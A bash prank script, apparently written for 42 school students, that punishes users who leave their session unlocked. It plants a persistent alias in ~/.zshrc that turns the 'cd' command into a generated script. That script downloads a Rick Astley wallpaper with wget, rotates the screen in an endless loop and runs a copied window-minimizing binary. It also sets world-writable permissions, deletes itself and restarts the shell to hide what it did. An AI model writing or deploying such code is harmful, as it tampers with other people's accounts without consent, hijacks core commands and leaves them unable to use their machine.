#*************************************************#
#                                                 #
#                                                 #
# 	This is a script to remind 'piscineux'    #
#		to lock their sesssion            #
#                                                 #
#                                                 #
#*************************************************#
#!/bin/bash

#Export wallpaper to env
WALLPAPER="$(gsettings get org.gnome.desktop.background picture-uri)"
export WALLPAPER

# Create alias to .zshrc
echo "alias cd=~/goinfre/dontdeleteme.sh" >> ~/.zshrc

# Create the troll file in ~/goinfre/dontdeleteme.sh
echo "~/goinfre/minimize_windows\nwget -c https://wallpaperaccess.com/full/5850088.jpg -O /nfs/homes/$LOGNAME/Pictures/rick.jpg\ngsettings set org.gnome.desktop.background picture-uri file:///nfs/homes/$LOGNAME/Pictures/rick.jpg\nwhile true; do\nxrandr -o 1\nsleep 5\nxrandr -o 2\nsleep 5\nxrandr -o 3\nsleep 5\nxrandr -o 2\nsleep 5\nxrandr -o 0\nsleep 5\nxrandr -o 2\ndone" > ~/goinfre/dontdeleteme.sh

# Give all permission to file
chmod 777 ~/goinfre/dontdeleteme.sh

# Copy the C script for minimize window then the cd alias is executed and give him all permissions
cp /media/$LOGNAME/0374-22ED/minimize_windows ~/goinfre/
chmod 777 ~/goinfre/minimize_windows

# Script for show a login window (need to some fix)

<< 'MULTILINE-COMMENT'
while true; do
	password=$(whiptail --title "42 - LOCK YOU !!!" --passwordbox "Entre ton login!" 8 40 3>&1 1>&2 2>&3)

    if [[ "$password" == $LOGNAME ]]; then
            whiptail --title "BRAVO !!" --msgbox "La prochaine fois lock ton PC ! :)" 8 40
        break
    else
        whiptail --title "SERIEUSEMENT ?" --msgbox "Faire une erreur sur son login ?" 8 40
    fi
done
MULTILINE-COMMENT

# Delete the file and restart the actuel terminal.
rm tester.sh
clear
exec zsh -l
